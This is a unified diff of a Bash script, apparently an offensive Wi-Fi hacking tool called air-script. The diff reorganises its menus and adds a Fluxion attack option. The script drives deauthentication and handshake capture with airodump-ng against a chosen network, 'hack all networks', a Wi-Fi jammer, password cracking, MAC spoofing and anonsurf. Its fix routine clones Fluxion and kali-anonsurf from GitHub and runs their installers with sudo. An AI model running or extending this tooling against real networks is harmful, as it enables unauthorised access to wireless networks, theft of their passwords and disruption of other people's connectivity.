@@ -54,15 +54,14 @@ echo -e "${Green}                         Version: 1.0.1 Stable"
 
 menu () {        ##### Display available options #####
 echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
-echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack A Wifi Network"
-echo -e "      ${Red}[${Blue}2${Red}] ${Green}Hack All Wifi Networks"
-echo -e "      ${Red}[${Blue}3${Red}] ${Green}Decrypt Passowrd(s)"
-echo -e "      ${Red}[${Blue}4${Red}] ${Green}Wifi Jammer"
-echo -e "      ${Red}[${Blue}5${Red}] ${Green}MAC Changer"
-echo -e "      ${Red}[${Blue}6${Red}] ${Green}Anonsurf"
-echo -e "      ${Red}[${Blue}7${Red}] ${Green}View log file"
-echo -e "      ${Red}[${Blue}8${Red}] ${Green}Help"
-echo -e "      ${Red}[${Blue}9${Red}] ${Green}Exit\n\n"
+echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack Wifi"
+echo -e "      ${Red}[${Blue}2${Red}] ${Green}Decrypt Passowrd(s)"
+echo -e "      ${Red}[${Blue}3${Red}] ${Green}Wifi Jammer"
+echo -e "      ${Red}[${Blue}4${Red}] ${Green}MAC Changer"
+echo -e "      ${Red}[${Blue}5${Red}] ${Green}Anonsurf"
+echo -e "      ${Red}[${Blue}6${Red}] ${Green}View log file"
+echo -e "      ${Red}[${Blue}7${Red}] ${Green}Help"
+echo -e "      ${Red}[${Blue}8${Red}] ${Green}Exit\n\n"
 while true; do
 echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
 read -p "└─────►$(tput setaf 7) " option
@@ -70,35 +69,31 @@ case $option in
   1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Wifi Network.."
      wifiHacking
      ;;
-  2) echo -e "\n[${Green}Selected${White}] Option 2 Hack All Wifi Networks.."
-     attackAll
-     exit 0
-     ;;
-  3) echo -e "\n[${Green}Selected${White}] Option 3 Decrypt Passowrd(s).."
+  2) echo -e "\n[${Green}Selected${White}] Option 3 Decrypt Passowrd(s).."
      crack
      exit 0
      ;;
-  4) echo -e "\n[${Green}Selected${White}] Option 4 Wifi Jammer..."
+  3) echo -e "\n[${Green}Selected${White}] Option 4 Wifi Jammer..."
      wifiJammer
      exit 0
      ;;
-  5) echo -e "\n[${Green}Selected${White}] Option 5 Changing MAC Address..."
+  4) echo -e "\n[${Green}Selected${White}] Option 5 Changing MAC Address..."
      macChange
      exit 0
      ;;
-  6) echo -e "\n[${Green}Selected${White}] Option 6 Anonsurf..."
+  5) echo -e "\n[${Green}Selected${White}] Option 6 Anonsurf..."
      anonsurf
      exit 0
      ;;
-  7) echo -e "\n[${Green}Selected${White}] Option 6 View log..."
+  6) echo -e "\n[${Green}Selected${White}] Option 6 View log..."
      log
      exit 0
      ;;
-  8) echo -e "\n[${Green}Selected${White}] Option 7 Help..."
+  7) echo -e "\n[${Green}Selected${White}] Option 7 Help..."
      Help
      exit 0
      ;;
-  9) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
+  8) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
      exit 0
      ;;
   *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
@@ -108,6 +103,61 @@ done
 }
 
 wifiHacking () {        ##### Sending DeAuth and capture handshake #####
+        ##### Display available options #####
+echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
+echo -e "      ${Red}[${Blue}1${Red}] ${Green}Air-Script Attacks"
+echo -e "      ${Red}[${Blue}2${Red}] ${Green}Fluxion Attacks"
+echo -e "      ${Red}[${Blue}3${Red}] ${Green}Exit\n\n"
+while true; do
+echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
+read -p "└─────►$(tput setaf 7) " option
+case $option in
+  1) echo -e "\n[${Green}Selected${White}] Option 1 Air Script Attacks.."
+     AirScriptMenu
+     ;;
+  2) echo -e "\n[${Green}Selected${White}] Option 2 Fluxion.."
+     FluxionMenu
+     exit 0
+     ;;
+  3) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
+     exit 0
+     ;;
+  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
+     ;;
+esac
+done
+}
+
+
+ AirScriptMenu() {        ##### Sending DeAuth and capture handshake #####
+        ##### Display available options #####
+echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
+echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack A Network"
+echo -e "      ${Red}[${Blue}2${Red}] ${Green}Hack All Networks"
+echo -e "      ${Red}[${Blue}3${Red}] ${Green}Exit\n\n"
+while true; do
+echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
+read -p "└─────►$(tput setaf 7) " option
+case $option in
+  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Network.."
+     AirScript
+     ;;
+  2) echo -e "\n[${Green}Selected${White}] Option 2 Hack All Networks.."
+     attackAll
+     exit 0
+     ;;
+  3) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
+     exit 0
+     ;;
+  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
+     ;;
+esac
+done
+}
+
+
+
+AirScript() {
 ./raspberry.sh
 monitor
 airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake wlan0mon > /dev/null &
@@ -181,6 +231,14 @@ sudo airmon-ng stop wlan0mon
 sudo ifconfig wlan0 up
 sudo systemctl start NetworkManager
 }
+
+
+FluxionMenu() {
+cd tools
+cd fluxion
+sudo ./fluxion.sh
+}
+
 
 crack() {
 wordlist
@@ -444,18 +502,25 @@ You can use method one, without the need of SSH or Ad Hoc. "
 }
 
 fix(){
+echo "$(tput setaf 2)Attempting to fix! Please wait..."
+cd /home/superuser/air-script/tools
 apt-get update
 ##################### aircrack-ng ##################### 
 apt-get install -y aircrack-ng
 ##################### macchanger ##################### 
 apt-get install -y macchanger
 ##################### anonsurf ##################### 
-cd /home/superuser/Desktop
 git clone https://github.com/Und3rf10w/kali-anonsurf
 chmod -R 755 kali-anonsurf
 cd kali-anonsurf
 ./installer.sh
 apt install ./kali-anonsurf.deb
+##################### Fluxion ##################### 
+cd ..
+git clone https://www.github.com/FluxionNetwork/fluxion.git
+chmod -R 755 fluxion
+cd fluxion
+sudo ./fluxion.sh -i
 echo "$(tput setaf 2)Fixing.. reboot recommended when finished."
 
 
